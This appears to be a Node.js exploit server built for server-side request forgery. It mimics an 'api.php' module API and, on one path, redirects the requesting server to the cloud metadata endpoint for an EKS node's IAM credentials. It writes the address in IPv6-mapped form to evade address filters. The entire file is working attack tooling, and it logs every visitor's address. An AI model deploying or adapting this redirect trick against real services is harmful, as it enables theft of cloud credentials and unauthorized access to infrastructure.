const https = require('https');
const http = require('http');
const fs = require("fs");

const options = {
  key: fs.readFileSync("/etc/letsencrypt/live/www.a4b7f74cc91ae.link/privkey.pem"),
  cert: fs.readFileSync("/etc/letsencrypt/live/www.a4b7f74cc91ae.link/fullchain.pem")
}

const port = 443;
const port2 = 80;
let content = "";

const server = https.createServer(options, (req, res) => {
  res.statusCode = 200;
  console.log(req.url+" "+req.socket.remoteAddress+" https");
  if(req.url === "/api.php/me"){
    content = "test";
  }else if(req.url === "/api.php/meta/modules"){
    content = '{"list": [{"module": "test", "primary_model":"model_test", "models": ["model_test"]}]}';
  }else if(req.url === "/api.php/test"){
    res.statusCode = 302;
    res.setHeader("Location","http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/iam-eks-node");
    //res.setHeader("Location","http://169.254.169.254/latest/meta-data/iam/security-credentials/iam-eks-node");
    res.end();
    return;
  }
  //res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Content-Length', `${content.length}`);
  res.end(content);
});

const server2 = http.createServer((req, res) => {
  console.log(req.url+" "+req.socket.remoteAddress+" http");
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Content-Length', `${content.length}`);
  res.end("HTTP");
});

server.listen(port, () => {
  console.log(`Server running on ${port}/`);
});

server2.listen(port2, () => {
  console.log(`Server2 running on ${port2}/`);
});